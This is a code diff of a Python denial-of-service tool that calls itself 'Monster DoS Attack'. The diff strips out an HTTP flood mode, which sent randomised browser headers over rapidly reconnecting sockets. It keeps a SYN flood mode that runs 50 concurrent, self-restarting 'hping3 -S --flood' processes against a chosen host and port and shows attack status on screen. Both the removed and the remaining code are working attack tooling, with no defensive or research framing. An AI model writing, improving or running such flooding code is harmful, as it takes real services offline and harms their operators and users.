@@ -14,15 +14,17 @@ import threading
 import shutil
 from rich.console import Console
 
+############
+# PRE-DEFS #
+############
 console = Console()
 
-###############
-# COUNTERS    #
-###############
-total_requests = 0
-total_errors = 0
+############
+# COUNTERS #
+############
 lock_counter = threading.Lock()
 start_time = 0
+total_errors = 0
 running = True
 processes = []
 
@@ -31,54 +33,10 @@ processes = []
 ##################
 USE_HPING3 = False
 NUM_TASKS = 50
-TIMEOUT = 3
-RECONNECT_DELAY = 0.01
 
-# Mode Choice
-try:
-    mode_choice = console.input("[yellow]Do you want Manual HTTP (m) or hping3 SYN Flood (h)? [/yellow]")
-    mode_choice = mode_choice.strip().lower()
-    if mode_choice in ["h", "hping", "hping3"]:
-        USE_HPING3 = True
-        console.print("[yellow]Using hping3 SYN Flood mode (Fourth Layer).[/yellow]")
-        NUM_TASKS = 50
-    else:
-        USE_HPING3 = False
-        console.print("[yellow]Using Manual HTTP mode.[/yellow]")
-        NUM_TASKS = 100
-        TIMEOUT = 3
-        RECONNECT_DELAY = 0.01
-except KeyboardInterrupt:
-    console.print("[red]Canceled by user.[/red]")
-    sys.exit(2)
-except Exception as e:
-    console.print(f"[red]Error: {e}[/red]")
-    sys.exit(1)
-
-######################
-# HEADERS (MANUAL)   #
-######################
-USER_AGENTS = [
-    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36",
-    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36",
-    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36",
-    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:145.0) Gecko/20100101 Firefox/145.0",
-    "Mozilla/5.0 (Linux; Android 14; Pixel 8 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Mobile Safari/537.36",
-    "Mozilla/5.0 (iPhone; CPU iPhone OS 18_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.0 Mobile/15E148 Safari/604.1",
-]
-
-SEC_CH_UA = [
-    '"Chromium";v="150", "Not;A=Brand";v="8"',
-    '"Google Chrome";v="150", "Chromium";v="150", "Not;A=Brand";v="8"',
-    '"Firefox";v="145"',
-]
-
-SEC_CH_UA_PLATFORM = ['"Linux"', '"Windows"', '"macOS"', '"Android"']
-SEC_CH_UA_MOBILE = ["?0", "?1"]
-ACCEPT_LANGUAGES = ["pt-BR,pt;q=0.9,en;q=0.8", "en-US,en;q=0.9", "pt-BR,pt;q=0.9,en;q=0.8,es;q=0.7"]
-
-HEADER_POOL = []
-
+################
+# BUILD HEADER #
+################
 def build_header(host, port):
     path = f"/?{''.join(random.choices(string.ascii_lowercase + string.digits, k=8))}={random.randint(1, 999999)}"
     header = (
@@ -109,56 +67,6 @@ def pre_generate_headers(host, port, size=2000):
 def get_random_header():
     return random.choice(HEADER_POOL)
 
-######################
-# MANUAL HTTP ATTACK #
-######################
-async def manual_attack(host, port, use_ssl=False):
-    global total_requests, total_errors
-    while True:
-        try:
-            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
-            sock.settimeout(TIMEOUT)
-
-            if use_ssl:
-                context = ssl.create_default_context()
-                sock = context.wrap_socket(sock, server_hostname=host)
-
-            loop = asyncio.get_event_loop()
-            await loop.sock_connect(sock, (host, port))
-
-            while True:
-                try:
-                    header = get_random_header()
-                    await loop.sock_sendall(sock, header.encode())
-                    with lock_counter:
-                        total_requests += 1
-                except (ConnectionResetError, BrokenPipeError, ConnectionAbortedError):
-                    with lock_counter:
-                        total_errors += 1
-                    break
-                except socket.timeout:
-                    with lock_counter:
-                        total_errors += 1
-                    break
-                except Exception:
-                    with lock_counter:
-                        total_errors += 1
-                    break
-
-            sock.close()
-            await asyncio.sleep(RECONNECT_DELAY)
-
-        except asyncio.CancelledError:
-            return
-        except KeyboardInterrupt:
-            return
-        except Exception:
-            with lock_counter:
-                total_errors += 1
-            await asyncio.sleep(RECONNECT_DELAY)
-            continue
-
 ###########################
 # HPING3 SYN FLOOD ATTACK #
 ##########################
@@ -178,7 +86,7 @@ def find_hping3():
 async def hping3_syn_task(host, port, hping3_path):
     global processes
     cmd = [hping3_path, "-S", "-p", str(port), "--flood", host]
-    while True:  # Loop infinito – reinicia se o processo morrer
+    while True:
         try:
             proc = await asyncio.create_subprocess_exec(
                 *cmd,
@@ -188,12 +96,16 @@ async def hping3_syn_task(host, port, hping3_path):
             with lock_counter:
                 processes.append(proc)
             await proc.wait()
-            # Se o processo morreu, reinicia automaticamente
         except asyncio.CancelledError:
             return
         except KeyboardInterrupt:
             return
-        except Exception:
+        except Exception as e:
+            with lock_counter:
+                total_errors += 1
+                n = total_errors
+            if n == 1:
+                print(f"[!] hping3 failed: {e} — check CAP_NET_RAW / sudo")
             await asyncio.sleep(0.5)
             continue
 
@@ -201,53 +113,31 @@ async def hping3_syn_task(host, port, hping3_path):
 # DISPLAY #
 ###########
 def update_display(host, port, mode):
-    global total_requests, total_errors, start_time, running
+    global start_time, running
     while running:
         elapsed = time.time() - start_time
-        with lock_counter:
-            req = total_requests
-            err = total_errors
-        rps = int(req / elapsed) if elapsed > 0 else 0
         os.system('clear' if os.name == 'posix' else 'cls')
         print("=" * 50)
-        if mode == "manual":
-            print("  Monster DoS Attack Status (HTTP)")
-            print("=" * 50)
-            print(f"  Host:Port     : {host}:{port}")
-            print(f"  Total Requests: {req:,}")
-            print(f"  RPS           : {rps:,}")
-            print(f"  Errors        : {err:,}")
-            print(f"  Uptime (s)    : {int(elapsed)}")
-            print(f"  Tasks         : {NUM_TASKS}")
-        else:  # hping3 mode
-            print("  Monster DoS Attack Status (SYN Flood / hping3)")
-            print("=" * 50)
-            print(f"  Host:Port     : {host}:{port}")
-            print(f"  Uptime (s)    : {int(elapsed)}")
-            print(f"  Tasks         : {NUM_TASKS}")
+        print("\033[0;35m  Monster DoS Attack Status (SYN Flood / hping3)")
         print("=" * 50)
-        print("  [Press Ctrl+C to stop]")
+        print(f"  Host:Port     : {host}:{port}")
+        print(f"  Uptime (s)    : {int(elapsed)}")
+        print(f"  Tasks         : {NUM_TASKS}")
+        print("=" * 50)
+        print("\033[31m  [Press Ctrl+C to stop]")
         time.sleep(1)
 
 ##############
 # MAIN ASYNC #
 ##############
-async def main_attack(host, port, use_ssl):
+async def main_attack(host, port):
     global start_time, running, processes
     start_time = time.time()
-
-    if USE_HPING3:
-        hping3_path = find_hping3()
-        thread = threading.Thread(target=update_display, args=(host, port, "hping3"))
-        thread.daemon = True
-        thread.start()
-        attack_tasks = [asyncio.create_task(hping3_syn_task(host, port, hping3_path)) for _ in range(NUM_TASKS)]
-    else:
-        pre_generate_headers(host, port)
-        thread = threading.Thread(target=update_display, args=(host, port, "manual"))
-        thread.daemon = True
-        thread.start()
-        attack_tasks = [asyncio.create_task(manual_attack(host, port, use_ssl)) for _ in range(NUM_TASKS)]
+    hping3_path = find_hping3()
+    thread = threading.Thread(target=update_display, args=(host, port, "hping3"))
+    thread.daemon = True
+    thread.start()
+    attack_tasks = [asyncio.create_task(hping3_syn_task(host, port, hping3_path)) for _ in range(NUM_TASKS)]
 
     try:
         await asyncio.gather(*attack_tasks)
@@ -277,10 +167,8 @@ def run(host, port, type):
         except:
             pass
 
-    use_ssl = type.lower() == "https"
-
     try:
-        asyncio.run(main_attack(host, port, use_ssl))
+        asyncio.run(main_attack(host, port))
     except KeyboardInterrupt:
         print("\n[!] Interrupted by user.")
         sys.exit(0)
